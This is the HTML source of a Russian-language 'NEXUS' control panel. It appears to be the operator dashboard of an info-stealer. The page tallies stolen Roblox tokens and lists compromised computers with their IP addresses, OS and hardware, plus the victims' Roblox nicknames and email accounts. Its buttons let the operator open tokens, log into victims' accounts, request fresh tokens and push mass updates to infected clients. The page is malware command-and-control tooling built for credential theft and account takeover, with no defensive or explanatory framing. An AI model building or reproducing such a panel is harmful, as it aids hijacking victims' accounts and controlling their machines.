<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>NEXUS — Панель управления</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="assets/style.css?v=111">
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
</head>
<body>
  <div class="sidebar-layout">
    <div id="sidebarSlot"></div>
    <main class="main-content">
      <div class="container" style="max-width: 1140px;">
        <div class="top-bar">
          <h1 class="page-title">Файлы и клиенты</h1>
        </div>

        <div class="stats-bar">
          <div class="stat-card">
            <div class="stat-label">Roblox Токены</div>
            <div class="stat-value accent" id="sRoblox">—</div>
          </div>
          <div class="stat-card">
            <div class="stat-label">Компьютеры</div>
            <div class="stat-value" id="sPCs">—</div>
          </div>
          <div class="stat-card">
            <div class="stat-label">Последняя активность</div>
            <div class="stat-value" id="sLast" style="font-size: 1.1rem; font-weight: 600;">—</div>
          </div>
          <div class="stat-card action-card" id="updateAllCard" style="grid-column: span 2; position: relative;">
            <div class="stat-label" id="updateAllLabel" style="color: var(--danger);">Обновление клиентов</div>
            <div style="display: flex; align-items: baseline; gap: 8px; margin: 0.4rem 0;">
              <span class="stat-value" id="updateAllCount" style="font-size: 2.8rem; color: var(--danger); line-height: 1;">0</span>
              <span style="font-size: 0.95rem; color: var(--text-secondary); font-weight: 500;" id="updateAllUnit">ПК</span>
            </div>
            <div id="updateAllSubtext" style="font-size: 0.8rem; color: var(--text-muted); font-weight: 500;">
              Нажмите для массового обновления
            </div>
          </div>
        </div>

        <!-- График статистики -->
        <div class="chart-card">
          <canvas id="statsChart"></canvas>
        </div>

        <div class="controls-panel">
          <div class="search-bar-wrapper">
            <input type="text" class="search-input" id="searchBar" placeholder="Поиск по имени компьютера или файла..." oninput="filterFiles()">
            <select class="filter-select" id="sortFiles" onchange="filterFiles()">
              <option value="date">По дате (новые)</option>
              <option value="roblox">Сначала с токеном</option>
              <option value="version">По версии</option>
            </select>
          </div>
          <button class="btn-refresh" onclick="loadFiles()">Обновить</button>
          <button class="btn-refresh" id="btnRequestAll">Запросить у всех</button>
        </div>

        <div class="files-grid" id="fileGrid">
          <div class="skeleton" style="height: 200px;"></div>
          <div class="skeleton" style="height: 200px;"></div>
          <div class="skeleton" style="height: 200px;"></div>
          <div class="skeleton" style="height: 200px;"></div>
        </div>
      </div>
    </main>
  </div>

  <div id="fileModal" class="modal-overlay" onclick="closeModal()">
    <div class="modal-container" onclick="event.stopPropagation()">
      <button class="modal-close" onclick="closeModal()">✕</button>
      <div class="modal-content-wrapper" style="flex-direction: column; padding: 1.5rem; overflow-y: auto;">
        <h3 class="modal-filename" id="modalFilename" style="text-align: center; margin-bottom: 1.25rem;">Название файла</h3>
        
        <div style="display: flex; gap: 1.25rem; flex-wrap: wrap;">
          <div class="modal-details-pane">
            <div class="specs-section">
              <h4 class="section-title">Характеристики ПК</h4>
              <div class="specs-grid">
                <div class="spec-row"><span class="spec-lbl">Компьютер</span><span class="spec-val" id="specName">—</span></div>
                <div class="spec-row"><span class="spec-lbl">Версия</span><span class="spec-val" id="specVersion">—</span></div>
                <div class="spec-row"><span class="spec-lbl">IP-адрес</span><span class="spec-val" id="specIp">—</span></div>
                <div class="spec-row"><span class="spec-lbl">ОС</span><span class="spec-val" id="specOs">—</span></div>
                <div class="spec-row"><span class="spec-lbl">CPU</span><span class="spec-val" id="specCpu">—</span></div>
                <div class="spec-row"><span class="spec-lbl">RAM</span><span class="spec-val" id="specRam">—</span></div>
                <div class="spec-row"><span class="spec-lbl">GPU</span><span class="spec-val" id="specGpu">—</span></div>
                <div class="spec-row"><span class="spec-lbl">Дата</span><span class="spec-val" id="specDate">—</span></div>
              </div>
            </div>
          </div>
          
          <div class="modal-roblox-pane">
            <div class="specs-section" id="robloxSpecsSection">
              <h4 class="section-title">Roblox аккаунт</h4>
              <div class="specs-grid">
                <div class="spec-row"><span class="spec-lbl">Никнейм</span><span class="spec-val" id="robloxSpecUser" style="color: var(--success); font-weight: 600;">—</span></div>
                <div class="spec-row" id="tokenStatusRow" style="display:none;"><span class="spec-lbl">Статус</span><span class="spec-val" id="tokenStatusText" style="color: var(--danger); font-weight: 500;">—</span></div>
                <div class="spec-row" id="tokenRequestRow"><span class="spec-lbl">Запрос токена</span><span class="spec-val" id="tokenRequestStatus">—</span></div>
              </div>
            </div>

            <div class="specs-section" id="emailsSection" style="display:none;">
              <h4 class="section-title">Почтовые аккаунты</h4>
              <div id="emailsList" style="max-height:160px; overflow-y:auto; display:flex; flex-direction:column; gap:4px; margin-top:4px;"></div>
            </div>

            <div class="modal-actions">
              <button class="modal-btn" id="modalOpenBtn" style="color:var(--success);">Открыть токены</button>
              <button class="modal-btn" id="modalLoginBtn" style="color:#22c55e;">Войти в аккаунт</button>
              <button class="modal-btn" id="modalRequestBtn" style="color:var(--accent);">Запросить токен</button>
              <button class="modal-btn" id="modalUpdateBtn" style="color:#ef4444;">Обновить клиент</button>
              <button class="modal-btn" id="modalEmailsBtn" style="color:#818cf8;">Почтовые аккаунты</button>
              <button class="modal-btn del-btn" id="modalDeleteBtn">Удалить</button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div id="toast"></div>

  <script src="assets/config.js?v=111"></script>
  <script src="assets/app.js?v=111"></script>
  <script src="assets/dashboard.js?v=111"></script>
</body>
</html>
